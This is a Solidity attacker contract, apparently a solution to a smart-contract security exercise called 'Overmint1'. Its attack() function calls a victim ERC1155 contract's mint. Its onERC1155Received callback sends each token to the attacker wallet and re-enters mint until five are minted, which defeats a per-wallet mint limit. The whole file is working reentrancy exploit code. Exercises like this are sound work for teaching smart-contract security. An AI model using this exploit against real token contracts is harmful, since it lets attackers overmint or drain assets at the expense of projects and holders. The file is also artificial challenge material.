//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "hardhat/console.sol";
import "../Overmint1-ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    address public victimAddress;
    address public attackerWallet;
    //bool public isAttacking = true;
    uint256 public mintCounter = 1;

    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
        attackerWallet = msg.sender;
    }

    function attack() public {
        //(bool success,) = victimAddress.call(abi.encodeWithSelector(bytes4(keccak256(bytes("mint()")))));
        //console.log("success from contract :", success);
        bytes memory callData = abi.encodeWithSignature("mint(uint256,bytes)", 0, "");
        (bool success,) = victimAddress.call(callData);

        //console.log("success1", success);
        //setIsAttacking(true);
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        IERC1155(victimAddress).safeTransferFrom(address(this), attackerWallet, 0, 1, "");
        if (mintCounter < 5) {
            mintCounter = mintCounter + 1;
            bytes memory callData = abi.encodeWithSignature("mint(uint256,bytes)", 0, "");
            (bool success,) = victimAddress.call(callData);
        }
        //do transfer erc1155s to attacker wallet
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        // Custom logic when multiple tokens are received
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return true;
    }
}
